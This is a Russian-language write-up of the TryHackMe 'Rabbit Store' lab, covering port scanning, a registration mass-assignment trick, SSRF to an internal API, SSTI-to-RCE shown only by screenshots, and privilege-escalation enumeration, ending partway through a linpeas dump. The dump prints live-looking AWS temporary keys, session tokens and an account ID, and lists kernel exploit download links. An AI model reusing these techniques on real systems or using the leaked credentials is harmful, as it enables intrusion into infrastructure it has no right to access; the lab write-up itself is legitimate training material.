# Сегодня решаем Rabbit Store от TRYHACKME


<img width="1487" height="1000" alt="{CE578074-2287-4441-8FF9-63EA7E3F7A29}" src="https://github.com/user-attachments/assets/f03e6aef-0a5d-4493-b7e3-60078fc68983" />

 
## Сканирование портов



```
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3f:da:55:0b:b3:a9:3b:09:5f:b1:db:53:5e:0b:ef:e2 (ECDSA)
|_  256 b7:d3:2e:a7:08:91:66:6b:30:d2:0c:f7:90:cf:9a:f4 (ED25519)
80/tcp    open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://cloudsite.thm/
|_http-server-header: Apache/2.4.52 (Ubuntu)
4369/tcp  open  epmd    Erlang Port Mapper Daemon
25672/tcp open  unknown
```

### 80 Порт

<img width="2556" height="1092" alt="{D0903653-BB82-4E78-9005-B7AE41E1DABE}" src="https://github.com/user-attachments/assets/976e5277-749d-428c-ba15-82a3f2907d82" />

что бы авторизоваться нам приходиться добавить storage.cloudsite.thm в /etc/hosts/ так как авторизация проходит на домене storage.cloudsite.thm

<img width="2560" height="900" alt="{B870F9F1-549E-491D-80E2-95F8564C4058}" src="https://github.com/user-attachments/assets/220aedeb-2629-4b59-b974-7b809f5aebf3" />

в бурпе нашел jwt решил посмотреть на него в расшифрованном виде, вижу что в jwt используется subscription

<img width="984" height="694" alt="{763D1177-61FD-4100-8E5C-029B2CDE6877}" src="https://github.com/user-attachments/assets/cd02dd10-f13a-458a-a32f-c8d2fa3fd8d4" />


при логине показывает inactive от сервера, если бы был секретный ключ то мы могли бы подделать jwt, но увы у нас его нету




так что придем к другому варианту, попробуем ввести в /api/register - "subscription":"active" 


<img width="1520" height="742" alt="{D7538C7C-DDDE-46D9-B505-82EA4C4A6EC0}" src="https://github.com/user-attachments/assets/c83935b0-57c6-4bee-b204-53ca9f467e11" />

## SSRF 

---
SSRF (Server-Side Request Forgery) — это уязвимость веб-безопасности, которая позволяет злоумышленнику заставить уязвимый сервер отправлять произвольные сетевые запросы от своего имени
---

мы видим форму загрузки файлов на локальный хост, так же чуть ниже видим то что можно устанавливать любые файлы по ссылке, первым делом я решил проверить возможно ли ssrf, вписал http://127.0.0.1:80/ и получил главную страницу cloudsite.thm, так же упустил один важный фактор, до этого я проходился фаззингом на домене storage.cloudsite.thm и нашел /api/docs к которому я не имел доступа, так как он был access denied, логичным было попробовать http://127.0.0.1:80/api/docs, что я и сделал, но по итогу мне выдало 404, так я пришел к тому что исказл другие открытые порты, наткнулся на 3000 порт, и после того как увидел главную страницу авторизации там, понял, что это то что нам нужно

<img width="2560" height="1285" alt="{8216FFDC-E607-4B0E-8398-ADE0855B4D02}" src="https://github.com/user-attachments/assets/4de573cb-4f0b-4455-b00c-cc51c0e33fa5" />

на этом скриншоте видно что как раз мой запрос к 3000 порту

<img width="1921" height="1023" alt="{A638F7D0-3B4F-4BC8-8B7A-46941838B535}" src="https://github.com/user-attachments/assets/e15fd95f-2596-4241-8565-3101dadf5494" />

### Содержимое /api/docs

тут мы прекрасно наблюдаем все api ручки с которыми мы можем работать, /api/register - отвечает за регистрацию 

```
Endpoints Perfectly Completed

POST Requests:
/api/register - For registering user
/api/login - For loggin in the user
/api/upload - For uploading files
/api/store-url - For uploadion files via url
/api/fetch_messeges_from_chatbot - Currently, the chatbot is under development. Once development is complete, it will be used in the future.

GET Requests:
/api/uploads/filename - To view the uploaded files
/dashboard/inactive - Dashboard for inactive user
/dashboard/active - Dashboard for active user

Note: All requests to this endpoint are sent in JSON format.
```

## SSTI to RCE

<img width="1489" height="726" alt="{1C60B2E7-3231-470F-B1AE-7862148D2805}" src="https://github.com/user-attachments/assets/e3147daa-6fe6-4598-aeca-4ef7d3848b9a" />

<img width="784" height="173" alt="{17E11B39-39A3-45B0-A203-5087225C3964}" src="https://github.com/user-attachments/assets/02a19493-044f-4b85-9954-2ac3404c0445" />

# LPE

Вот мы и на машине, прежде чем использовать сканера и искать через них способ lpe я решаю побегать по директориям и посмотреть что тут есть интересное

```
azrael@forge:~/snap$ ls -la
ls -la
total 12
drwx------ 3 azrael azrael 4096 Mar 22  2024 .
drwx------ 9 azrael azrael 4096 Sep 12  2024 ..
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 lxd
azrael@forge:~/snap$ cd lxd
cd lxd
azrael@forge:~/snap/lxd$ ls -la
ls -la
total 20
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 .
drwx------ 3 azrael azrael 4096 Mar 22  2024 ..
drwxr-xr-x 2 azrael azrael 4096 Mar 22  2024 24061
drwxr-xr-x 2 azrael azrael 4096 Mar 22  2024 29619
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 common
lrwxrwxrwx 1 azrael azrael    5 Sep 20  2024 current -> 29619
azrael@forge:~/snap/lxd$ cd common
cd common
azrael@forge:~/snap/lxd/common$ ls -la
ls -la
total 12
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 .
drwxr-xr-x 5 azrael azrael 4096 Sep 20  2024 ..
drwxrwxr-x 2 azrael azrael 4096 Mar 22  2024 config
azrael@forge:~/snap/lxd/common$ cd config
cd config
azrael@forge:~/snap/lxd/common/config$ ls -la
ls -la
total 12
drwxrwxr-x 2 azrael azrael 4096 Mar 22  2024 .
drwxr-xr-x 3 azrael azrael 4096 Mar 22  2024 ..
-rw-rw-r-- 1 azrael azrael  188 Mar 22  2024 config.yml
azrael@forge:~/snap/lxd/common/config$ cat config.yml
cat config.yml
default-remote: local
remotes:
  images:
    addr: https://images.linuxcontainers.org
    protocol: simplestreams
    public: true
  local:
    addr: unix://
    public: false
aliases: {}
azrael@forge:~/snap/lxd/common/config$ groups azrael
groups azrael
azrael : azrael
azrael@forge:~/snap/lxd/common/config$ getent group lxd
getent group lxd
lxd:x:117:
azrael@forge:~/snap/lxd/common/config$ id
id
uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
azrael@forge:~/snap/lxd/common/config$ grep '^lxd:' /etc/group
grep '^lxd:' /etc/group
lxd:x:117:
azrael@forge:~/snap/lxd/common/config$ 
```
как мы видим я не состою в группе lxd так что не смогу получить root от него, я посмотреть дальше все, но ничего не нашел так что использвоал linpeas

```
azrael@forge://tmp$ ./linpeas.sh



                            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
                    ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄
             ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄
         ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄
         ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
         ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
         ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
         ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
         ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
         ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
         ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
         ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
         ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
         ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
         ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
               ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                     ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

    /---------------------------------------------------------------------------------\
    |                             Do you like PEASS?                                  |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                                                                                 
    |         Follow on Twitter         :     @hacktricks_live                        |                                                                                                 
    |         Respect on HTB            :     SirBroccoli                             |                                                                                                 
    |---------------------------------------------------------------------------------|                                                                                                 
    |                                 Thank you!                                      |                                                                                                 
    \---------------------------------------------------------------------------------/                                                                                                 
          LinPEAS-ng by carlospolop                                                                                                                                                     
                                                                                                                                                                                        
ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                      
                                                                                                                                                                                        
Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
 LEGEND:                                                                                                                                                                                
  RED/YELLOW: 95% a PE vector
  RED: You should take a look into it
  LightCyan: Users with console
  Blue: Users without console & mounted devs
  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
  LightMagenta: Your username

 Starting LinPEAS. Caching Writable Folders...
                               ╔═══════════════════╗
═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                                                                                     
                               ╚═══════════════════╝                                                                                                                                    
OS: Linux version 5.15.0-118-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024
User & Groups: uid=1000(azrael) gid=1000(azrael) groups=1000(azrael)
Hostname: forge

[+] /usr/bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
[+] /usr/bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                 
[+] /usr/bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)                                                      
                                                                                                                                                                                        

Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
uniq: write error: Broken pipe
DONE
                                                                                                                                                                                        
                              ╔════════════════════╗
══════════════════════════════╣ System Information ╠══════════════════════════════                                                                                                      
                              ╚════════════════════╝                                                                                                                                    
╔══════════╣ Operative system
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                                                                       
Linux version 5.15.0-118-generic (buildd@lcy02-amd64-080) (gcc (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0, GNU ld (GNU Binutils for Ubuntu) 2.38) #128-Ubuntu SMP Fri Jul 5 09:28:59 UTC 2024
Distributor ID: Ubuntu
Description:    Ubuntu 22.04.4 LTS
Release:        22.04
Codename:       jammy

╔══════════╣ Sudo version
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                                                                          
Sudo version 1.9.9                                                                                                                                                                      


╔══════════╣ PATH
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                                                                                  
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin                                                                                                                  

╔══════════╣ Date & uptime
Fri Oct  2 04:17:12 AM UTC 2026                                                                                                                                                         
 04:17:12 up  1:07,  0 users,  load average: 0.52, 0.15, 0.05

╔══════════╣ Unmounted file-system?
╚ Check if you can mount umounted devices                                                                                                                                               
/dev/disk/by-id/dm-uuid-LVM-NEMzNrZYjkz0jtJBa1M9v8xFFALHwKo1ZvZD1ZJrwjDEyesKmV2qmsCXOJa86oPO    /       ext4    defaults        0 1                                                     
/dev/disk/by-uuid/363644ae-f249-4fde-9994-38dc08419512  /boot   ext4    defaults        0 1

╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
disk                                                                                                                                                                                    

╔══════════╣ Environment
╚ Any private information inside environment variables?                                                                                                                                 
LESSOPEN=| /usr/bin/lesspipe %s                                                                                                                                                         
USER=azrael
SHLVL=2
HOME=/home/azrael
OLDPWD=//
PYTHONUNBUFFERED=1
WERKZEUG_SERVER_FD=4
LOGNAME=azrael
_=./linpeas.sh
WERKZEUG_RUN_MAIN=true
LANG=en_US.UTF-8
SHELL=/bin/bash
LESSCLOSE=/usr/bin/lesspipe %s %s
PWD=//tmp

╔══════════╣ Searching Signature verification failed in dmesg
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed                                                                   
dmesg Not Found                                                                                                                                                                         
                                                                                                                                                                                        
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester                                                                                                                                      
cat: write error: Broken pipe                                                                                                                                                           
cat: write error: Broken pipe
[+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

   Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
   Exposure: probable
   Tags: [ ubuntu=(22.04) ]{kernel:5.15.0-27-generic}
   Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-2586] nft_object UAF

   Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
   Exposure: less probable
   Tags: ubuntu=(20.04){kernel:5.12.13}
   Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
   Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

[+] [CVE-2022-0847] DirtyPipe

   Details: https://dirtypipe.cm4all.com/
   Exposure: less probable
   Tags: ubuntu=(20.04|21.04),debian=11
   Download URL: https://haxx.in/files/dirtypipez.c

[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: mint=19,ubuntu=18|20, debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: less probable
   Tags: centos=6|7|8,ubuntu=14|16|17|18|19|20, debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: less probable
   Tags: ubuntu=20.04{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154


╔══════════╣ Protections
═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                                                                           
apparmor module is loaded.
═╣ AppArmor profile? .............. unconfined
═╣ is linuxONE? ................... s390x Not Found
═╣ grsecurity present? ............ grsecurity Not Found                                                                                                                                
═╣ PaX bins present? .............. PaX Not Found                                                                                                                                       
═╣ Execshield enabled? ............ Execshield Not Found                                                                                                                                
═╣ SELinux enabled? ............... sestatus Not Found                                                                                                                                  
═╣ Seccomp enabled? ............... disabled                                                                                                                                            
═╣ User namespace? ................ enabled
═╣ unpriv_userns_clone? ........... 1
═╣ unpriv_bpf_disabled? ........... 2
═╣ Cgroup2 enabled? ............... enabled
═╣ kptr_restrict? ................. 1
═╣ dmesg_restrict? ................ 1
═╣ ptrace_scope? .................. 1
═╣ perf_event_paranoid? ........... 4
═╣ mmap_min_addr? ................. 65536
═╣ lockdown mode? ................. [none] integrity confidentiality
═╣ Kernel hardening flags? ........ CONFIG_SLAB_FREELIST_RANDOM=y
CONFIG_SLAB_FREELIST_HARDENED=y
CONFIG_RANDOMIZE_BASE=y
CONFIG_STACKPROTECTOR=y
CONFIG_STACKPROTECTOR_STRONG=y
# CONFIG_KASAN is not set
═╣ Is ASLR enabled? ............... Yes
═╣ Printer? ....................... No
═╣ Is this a virtual machine? ..... Yes (amazon)                                                                                                                                        

╔══════════╣ Kernel Modules Information
══╣ Kernel modules with weak perms?                                                                                                                                                     
                                                                                                                                                                                        
══╣ Kernel modules loadable? 
Modules can be loaded                                                                                                                                                                   
══╣ Module signature enforcement? 
Not enforced                                                                                                                                                                            

╔══════════╣ CVE-2025-38352 - POSIX CPU timers race
═╣ Kernel release ............... 5.15.0-118-generic                                                                                                                                    
═╣ Comparable version ........... 5.15.0.118                                                                                                                                            
═╣ Task_work config ............. Enabled (y) (from /boot/config-5.15.0-118-generic)                                                                                                    
═╣ Patch status ................. Kernel train 5.15.0.118 (verify commit f90fff1e152dedf52b932240ebbd670d83330eca manually)
═╣ CVE-2025-38352 risk .......... Low - CONFIG_POSIX_CPU_TIMERS_TASK_WORK is enabled



                                   ╔═══════════╗
═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                                                                                     
                                   ╚═══════════╝                                                                                                                                        
╔══════════╣ Container related tools present (if any):
/snap/bin/lxc                                                                                                                                                                           
/usr/sbin/apparmor_parser
/usr/bin/nsenter
/usr/bin/unshare
/usr/sbin/chroot
/usr/sbin/capsh
/usr/sbin/setcap
/usr/sbin/getcap

╔══════════╣ Container details
═╣ Is this a container? ........... No                                                                                                                                                  
═╣ LXC version ................ Client version: 4.0.10                                                                                                                                  
Server version: unreachable
═╣ LXC info ................... lxc Not Found
═╣ Any running containers? ........ No                                                                                                                                                  
                                                                                                                                                                                        


                                     ╔═══════╗
═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════                                                                                                     
                                     ╚═══════╝                                                                                                                                          
grep: /etc/motd: No such file or directory
Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                                                                                                                                        
═╣ GCP Virtual Machine? ................. No
═╣ GCP Cloud Funtion? ................... No
═╣ AWS ECS? ............................. No
═╣ AWS EC2? ............................. Yes
═╣ AWS EC2 Beanstalk? ................... No
═╣ AWS Lambda? .......................... No
═╣ AWS Codebuild? ....................... No
═╣ DO Droplet? .......................... No
═╣ IBM Cloud VM? ........................ No
═╣ Azure VM or Az metadata? ............. No
═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
═╣ Azure Automation Account? ............ No
═╣ Aliyun ECS? .......................... No
═╣ Tencent CVM? ......................... No

╔══════════╣ AWS EC2 Enumeration
ami-id: ami-0d98aac0b051a140e                                                                                                                                                           
instance-action: none
instance-id: i-03b15bf46e954dae0
instance-life-cycle: spot
instance-type: t3a.medium
region: eu-central-1

══╣ Account Info
{                                                                                                                                                                                       
  "Code" : "Success",
  "LastUpdated" : "2026-10-02T03:52:30Z",
  "AccountId" : "739930428441"
}

══╣ Network Info
Mac: 06:ff:f6:90:62:1f/                                                                                                                                                                 
Owner ID: 739930428441
Public Hostname: 
Security Groups: Cell-prod-eu-central-1b-CellInstanceSecurityGroupF0B278FB-qxfi7aMJvXuk
Private IPv4s:

Subnet IPv4: 10.113.128.0/18
PrivateIPv6s:

Subnet IPv6: 
Public IPv4s:



══╣ IAM Role
{                                                                                                                                                                                       
  "Code" : "Success",
  "LastUpdated" : "2026-10-02T03:51:42Z",
  "InstanceProfileArn" : "arn:aws:iam::739930428441:instance-profile/vulnerable-machine",
  "InstanceProfileId" : "AIPA2YR2KKQMUBACPRZLH"
}
Role: vulnerable-machine
{
  "Code" : "Success",
  "LastUpdated" : "2026-10-02T03:51:28Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQM3HFHJ6ZH",
  "SecretAccessKey" : "eRFe3PEnIx+gcPQS/FnGovwgLp4tdgRa2SdL9Ahy",
  "Token" : "IQoJb3JpZ2luX2VjEMT//////////wEaDGV1LWNlbnRyYWwtMSJIMEYCIQD8T6qFgZRVhQEgDPooSajeh6H4RZEV2AMIbqZNzUGl+gIhAITcl/weg+4jPpoFHJyb5M3BTH3jk8Mi7bRdZlKH+NCnKtAFCIz//////////wEQAxoMNzM5OTMwNDI4NDQxIgzl9WEKvjXaeyhJNYUqpAVQbj4IUf15WQGiS/J/SsR+NN2QOsp+3zGDRhFe7WIJkQ/gGi0zHirOlOMIUa2lIjNKNP94PYwUIJLpZeQo62PM9kzs2d63fGGmVCDFtwet4LsyiC0RHwQQ49uVB/rIy7a0cY6FuNT+3rhx/kA6rGucqwAtE3Ym/LU2KUnkA/K73hAan8bV5IL7y1sT3tieNNwuGM/4R+22j/vJyutnHorRaAlrMglUU0nOmSQ2/XSkgTy+MDRqkwxhVDO5yPwlNsK84gHDPOIZba1ASFSBNBW79aPWNg/2EK9Oxr8GVqigprcE4YiQ7rFWfkxL7cYDz0VyZAtleou4DyAhfnUZ+OKttp8yQPmtMYLeB/8lzB+8+UkjJ06Ic0s7i2h3qDGo5053mlTj+ym9daIcrlPT7R6sUPWstzBJrJr3tlq/GJt3FnIKxvHUmnFSzEB+AsRw8FytTphUGXuSsucWFP7RkiM1CPJjhX9cU2WoxOCizCqsRdlICkU4XeTHAIUKkgVcXxV4UBl3EYKI0rDh8PmdcOOF21fWUMDTy6lFsco4oUEtfr65hHp7F0eHhGmAblCocjIutGk6TtytSbDivaxLfJWous/8Vrahyl4hOVdFzTGNUvCDwkT7/GKNqINsIAqRfOmEjCow2lffx7IjHEgan7aOQkJBXaDs/luxuIx2zbsXQppyrOqub6lmMeIazSFg9wjCJGd8D9m7y60YWNPJjPMmL8zKjPAB0C6wFqmWsi/C0ur7QpfXNGZf5tTJ/NK+OZv61jxDbowF+//jQH1JRwQpHlEEpX+FcAI0nVESrl2ogJk4OVSxzNG0Z7FpOxeuKr9pvOIE5ObyHtSWZq4yQpJL2jlQ2m4SpvC1CmxZyA/bIu7epkBfU4iXes3jsjW7D0FS+MeLMM7U/NUGOrABoIkXghJW2Pmscr6zZ9yAtAgXJy4/DL6Jh+pra5bTsJKK4rrd8fGX3reDo+NHubJu3toPR4RiZnsYy7RXS2yq/5U7O3Pd8Ov+mSZ198qF/Jx2S9Vm32W8IZYnTXCJL4bCeDaviS6WPZoq4TZrQFC+VYAnCMnuWG5LS9lZq8bEpx27WLjebkAhqNS1g01M0WODSbV3q/OSvE0o6R1mEhUXoeur4gdBxHHskxv6HzAydeE=",
  "Expiration" : "2026-10-02T10:06:39Z"
}


══╣ User Data
Content-Type: multipart/mixed; boundary="==BOUNDARY=="                                                                                                                                  
MIME-Version: 1.0


--==BOUNDARY==
Content-Type: text/cloud-config
MIME-Version: 1.0

#cloud-config
bootcmd:
  - 'mkdir -p /etc/thm'
  - 'echo "b0b9f713e5d56b97e8b236e9c5daa43927683e62e765e760a85555dd3a0bb4c0" > /etc/thm/ai-token'
  - 'chmod 0600 /etc/thm/ai-token'

--==BOUNDARY==--

══╣ EC2 Security Credentials
{                                                                                                                                                                                       
  "Code" : "Success",
  "LastUpdated" : "2026-10-02T03:52:19Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIA2YR2KKQMWZLKRR4W",
  "SecretAccessKey" : "numDrrO5wZ2QyGl+0PaCambHJxYmgsLycj0bWXc2",
  "Token" : "IQoJb3JpZ2luX2VjEMT//////////wEaDGV1LWNlbnRyYWwtMSJGMEQCIA1ZJ3tvFE5tpNTTfNpAmjsRStDN9L5es0DHsIFXFJEJAiBa44tCO6w6WB+4aXn8SQ4c+/BGbMKXkSZ3Uo9pyzP8eirZBAiN//////////8BEAMaDDczOTkzMDQyODQ0MSIMA7mo3mHe9DtxSnVBKq0E/XwOviIKzK+az+HDmoPcfbuD73cJ12kOm5P+motwGOrZ0r4xju6pqIZkrsluCn+0QqDH8cB54sUXer5rAtXfaTkPcDLtONI3peWIWfrGS27FUs4LGvUT1oYSU95zOfP2YC+/u6otI7R4exqAGhd8XXj8JfMsRmnTipB4jHkeUH9YI0+65mXSydzJSlmLPLy/KfDFVRjMNMd5E/eHnbVZT2xkXWzGTa06deR55jl4xPUcrGsDKVWk6k/vF8T5U4Ps6HF4+fi2OKe6HWAqJ0+RJVxFJqrF6k7HkCGOPeKvG694w9qtiKIjEeKQ3vGsgSnbAVOyghgFMQONeT7fe0WAv6Pt8ebVkn0EsuqmDvM0AwKQ3CdwoWpTos8uH2At+xAtgOI2hHzzY+9eSSPJmOMKtjGcA2t1/TR5cTR7J+7sCJQ09cp0I7wNi0cQM7XzUHlmyyjnUNXvpnSpjb09Gv/VzqF+eWo1xGfBBxBph3tWUKbGzO+SuIh1tXLsOBzgyuorDPadE9G/zx0/G1OD5r9ibcWv/KbnFI0WF3Xu3eExJz+d7RC6GPROnQ9caXvYk/ulhEzYgsokMDaPPX2i0rqkN+AgSBV0fm/nJBlv1aBvr5h2n58KHQVvgMFXKjgDaTOAfYSP69dY6utUyoR9CLcpdXDDLbO68oi2pivBobfof5ETyIvrXdlMt4b0ICVX5HmQ/glUliNU2ppiNwWjg84bso8q17lVniEvPIf2k3YwztT81QY6lAIpXq2gzECjFbMPtj/5NMjCkYRvan5Uz6aoen5+5wDox60jQwJuyVH+iVJnnG17ImyMk7L6uhcfPOUtnmCwNMzlOtRnMR2upP7QSwb/dF6YjiW43OZWR/wX1UjYTfBcIKORtsNv6gBzhO1jRZX1JOhK1n7cF+7w/P6gRgThQTEhC34BQpkuFXky38aLBH/IBuO1DfY5eQmT9f5Ow99BcwYOFSVWTp/+rwgkjaorzdGVVUMi5XxkSXuOIWiLLTNNIvfmIJkN0eD2AHOviGiQ9se20kQjsPUwyzP4YeyY91qJRbmeFf0XJq5diXhElJJ9iyIkZBh1vyS+lf0Z77S8z0USRpmg4Qu+SBAz004IBCFJkQQuk6U=",
  "Expiration" : "2026-10-02T10:06:45Z"
}
══╣ SSM Runnig
root         599  0.0  0.4 1832632 18640 ?       Ssl  03:10   0:00 /usr/bin/amazon-ssm-agent                                                                                            
root         934  0.0  0.6 1915792 26852 ?       Sl   03:10   0:01 /usr/bin/ssm-agent-worker



                ╔════════════════════════════════════════════════╗
════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                                                                                      
                ╚════════════════════════════════════════════════╝                                                                                                                      
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                             
root           1  0.0  0.3 166548 11924 ?        Ss   03:09   0:02 /sbin/init auto automatic-ubiquity noprompt                                                                          
root         382  0.0  0.3  64276 15376 ?        S<s  03:10   0:00 /lib/systemd/systemd-journald
root         419  0.0  0.6 289316 27100 ?        SLsl 03:10   0:00 /sbin/multipathd -d -s
root         423  0.0  0.1  26788  7536 ?        Ss   03:10   0:00 /lib/systemd/systemd-udevd
root        7601  0.0  0.1  26788  4840 ?        S    04:17   0:00  _ /lib/systemd/systemd-udevd
systemd+     578  0.0  0.1  89364  6716 ?        Ssl  03:10   0:00 /lib/systemd/systemd-timesyncd
  └─(Caps) 0x0000000002000000=cap_sys_time
systemd+     586  0.0  0.2  16128  8168 ?        Ss   03:10   0:00 /lib/systemd/systemd-networkd
  └─(Caps) 0x0000000000003c00=cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw
systemd+     588  0.0  0.3  25540 12704 ?        Ss   03:10   0:00 /lib/systemd/systemd-resolved
  └─(Caps) 0x0000000000002000=cap_net_raw
root         599  0.0  0.4 1832632 18640 ?       Ssl  03:10   0:00 /usr/bin/amazon-ssm-agent
root         934  0.0  0.6 1915792 26852 ?       Sl   03:10   0:01  _ /usr/bin/ssm-agent-worker
azrael       604  0.0  0.7  38276 29208 ?        Ss   03:10   0:00 /usr/bin/python3 /home/azrael/chatbotServer/chatbot.py
